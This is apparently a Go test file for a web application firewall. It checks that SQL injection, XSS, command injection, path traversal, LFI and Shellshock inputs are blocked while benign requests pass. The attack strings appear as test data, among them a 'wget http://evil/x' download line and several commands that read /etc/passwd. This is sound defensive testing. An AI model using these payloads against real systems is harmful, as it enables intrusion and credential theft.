package shield

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/ahkurdev/garudashield/internal/config"
	"github.com/ahkurdev/garudashield/internal/reqview"
)

// reqWithQuery builds a request whose query is properly URL-encoded (so the
// engine decodes it before WAF inspection, mirroring real clients). RemoteAddr
// is set to the given IP so per-IP state (reputation, fast-fail) keys correctly.
func reqWithQuery(method, path, query, body, ip string) *http.Request {
	var u string
	if query != "" {
		u = path + "?" + url.Values{"q": {query}}.Encode()
	} else {
		u = path
	}
	req := httptest.NewRequest(method, u, strings.NewReader(body))
	req.RemoteAddr = ip + ":1234"
	return req
}

func attackConfig() config.Config {
	return config.Config{
		Version: "3.0.0",
		Shield:  config.Shield{ModeName: "normal", BudgetMs: 5},
		Defense: config.Defense{
			WAF: config.WAFConfig{
				Enabled:          true,
				SQLi:             true,
				XSS:              true,
				CommandInjection: true,
				PathTraversal:    true,
				LFI:              true,
				RFI:              true,
				Shellshock:       true,
				Scanners:         true,
			},
		},
	}
}

func TestWAFBlocksKnownAttacks(t *testing.T) {
	sh := New(attackConfig())

	cases := []struct {
		name      string
		method    string
		path      string
		query     string
		ip        string
		wantBlock bool
	}{
		{"sqli-union", "GET", "/", "1' UNION SELECT * FROM users--", "203.0.113.11", true},
		{"sqli-or", "GET", "/", "user=1' OR '1'='1", "203.0.113.12", true},
		{"xss-script", "GET", "/", "<script>alert(1)</script>", "203.0.113.13", true},
		{"xss-onerror", "GET", "/", "<img src=x onerror=alert(1)>", "203.0.113.14", true},
		{"cmdi-cat", "GET", "/", ";cat /etc/passwd", "203.0.113.15", true},
		{"cmdi-pipe", "GET", "/", "|wget http://evil/x", "203.0.113.16", true},
		{"ptrav", "GET", "/", "../../../../etc/passwd", "203.0.113.17", true},
		{"lfi", "GET", "/", "php://filter/convert.base64-encode/resource=/etc/passwd", "203.0.113.18", true},
		{"scanner-sqlmap", "GET", "/", "utm=sqlmap", "203.0.113.19", true},
		{"benign-search", "GET", "/", "cute cats", "198.51.100.21", false},
		{"benign-home", "GET", "/about", "", "198.51.100.22", false},
		{"benign-post", "POST", "/login", "", "198.51.100.23", false},
	}

	for _, c := range cases {
		req := reqWithQuery(c.method, c.path, c.query, "", c.ip)
		v := reqview.New(req, nil)
		res := sh.Evaluate(v, c.ip)
		blocked := res.Action != ActionPass
		if blocked != c.wantBlock {
			t.Errorf("%s: blocked=%v want %v (action=%v reason=%q)", c.name, blocked, c.wantBlock, res.Action, res.Reason)
		}
	}
}

func TestWAFShellshockHeader(t *testing.T) {
	sh := New(attackConfig())
	req := httptest.NewRequest("GET", "/", nil)
	req.RemoteAddr = "203.0.113.8:1234"
	req.Header.Set("User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'")
	v := reqview.New(req, nil)
	res := sh.Evaluate(v, "203.0.113.8")
	if res.Action != ActionBlock {
		t.Fatalf("shellshock header not blocked: %+v", res)
	}
}

func TestBenignRequestPasses(t *testing.T) {
	sh := New(attackConfig())
	req := httptest.NewRequest("GET", "/products?page=2", nil)
	req.RemoteAddr = "198.51.100.23:1234"
	v := reqview.New(req, nil)
	res := sh.Evaluate(v, "198.51.100.23")
	if res.Action != ActionPass {
		t.Fatalf("benign request should pass, got %v (%q)", res.Action, res.Reason)
	}
}
